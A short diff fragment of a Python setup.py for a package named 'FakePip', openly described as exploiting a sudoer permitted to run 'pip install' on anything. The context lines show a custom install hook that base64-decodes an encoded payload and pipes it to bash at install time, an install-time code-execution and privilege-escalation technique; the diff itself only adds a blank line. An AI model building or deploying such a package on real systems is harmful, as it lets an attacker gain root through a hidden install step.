@@ -15,6 +15,7 @@ class CustomInstall(install):
     os.system('echo %s|base64 -d|bash' % encoded)
 
 
+    
 setup(name='FakePip',
       version='0.0.1',
       description='This will exploit a sudoer able to /usr/bin/pip install *',
